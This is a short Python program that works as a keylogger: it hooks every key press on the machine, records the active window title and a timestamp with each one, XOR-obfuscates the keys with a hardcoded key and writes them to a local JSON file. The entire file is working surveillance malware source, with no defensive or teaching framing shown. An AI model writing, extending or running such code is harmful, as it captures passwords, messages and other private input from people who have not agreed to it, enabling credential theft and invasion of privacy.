from datetime import datetime
import keyboard
import pygetwindow as gw
import json
import binascii


class KeyLoggerService:
    def __init__(self, file_writer, cipher):
        self.data = {}
        self.file_writer = file_writer
        self.cipher = cipher

    def on_press(self, event):
        window = gw.getActiveWindow()
        timestamp = datetime.now().strftime("%d/%m/%y %H:%M")
        key = self._format_key(event.name)
        encrypted_key = self.cipher.encrypt(key)

        if window not in self.data:
            self.data[window] = {timestamp: encrypted_key}
        elif timestamp not in self.data[window]:
            self.data[window][timestamp] = encrypted_key
        else:
            self.data[window][timestamp] += encrypted_key

        self.file_writer.write_to_file(self.data)

    def _format_key(self, key_name):
        if key_name == "enter":
            return " \n "
        elif key_name == "space":
            return " "
        elif len(key_name) > 1:
            return f" [{key_name}] "
        return key_name


class FileWriter:
    def __init__(self, file_path='./data.json'):
        self.file_path = file_path

    def write_to_file(self, data):
        with open(self.file_path, 'w', encoding="utf-8") as file:
            json.dump(data, file, indent=4, ensure_ascii=False)


class XorCipher:
    def __init__(self, key="thisIsMyXorKey"):
        self.key = key

    def encrypt(self, text):
        encrypted = self._xor_process(text)
        return binascii.hexlify(encrypted.encode()).decode()

    def decrypt(self, text):
        encrypted_bytes = binascii.unhexlify(text)
        return self._xor_process(encrypted_bytes.decode())

    def _xor_process(self, text):
        key_cycle = (self.key * ((len(text) // len(self.key)) + 1))[:len(text)]
        return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(text, key_cycle))


if __name__ == "__main__":
    file_writer = FileWriter()
    xor_cipher = XorCipher()
    key_logger = KeyLoggerService(file_writer, xor_cipher)

    keyboard.on_press(key_logger.on_press)
    keyboard.wait()